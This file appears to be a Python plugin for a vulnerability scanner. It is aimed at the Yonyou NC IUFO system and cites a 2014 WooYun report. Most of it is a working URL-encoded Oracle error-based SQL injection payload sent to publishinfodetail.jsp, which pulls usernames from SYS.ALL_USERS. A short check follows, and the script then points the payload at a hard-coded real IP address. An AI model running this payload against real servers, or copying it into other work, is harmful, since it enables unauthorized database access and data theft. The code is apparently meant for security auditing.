#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'scanf'
#http://www.wooyun.org/bugs/wooyun-2014-089208
#General SQL NC-IUFO injection system
def assign(service, arg):
    if service == "yongyou_nc":
        return True, arg
def audit(args):
    payload = "epp/detail/publishinfodetail.jsp?pk_message=1002A31000000000BS0X%27%20AND%209561%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28104%29%7C%7CCHR%28114%29%7C%7CCHR%28113%29%7C%7C%28REPLACE%28REPLACE%28REPLACE%28REPLACE%28%28SELECT%20NVL%28CAST%28USERNAME%20AS%20VARCHAR%284000%29%29%2CCHR%2832%29%29%20FROM%20%28SELECT%20USERNAME%2CROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS%20ORDER%20BY%201%20ASC%29%20WHERE%20LIMIT%3D34%29%2CCHR%2832%29%2CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%2CCHR%2836%29%2CCHR%28113%29%7C%7CCHR%28100%29%7C%7CCHR%28113%29%29%2CCHR%2864%29%2CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2CCHR%2835%29%2CCHR%28113%29%7C%7CCHR%28117%29%7C%7CCHR%28113%29%29%29%7C%7CCHR%28113%29%7C%7CCHR%28105%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20scanf"
    verify_url = args + payload
    code, head, content, errcode,finalurl = curl.curl(verify_url)
    if code==500 and 'SYSTEM' in content:
        security_info(verify_url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_nc', 'http://123.232.105.202/')[1])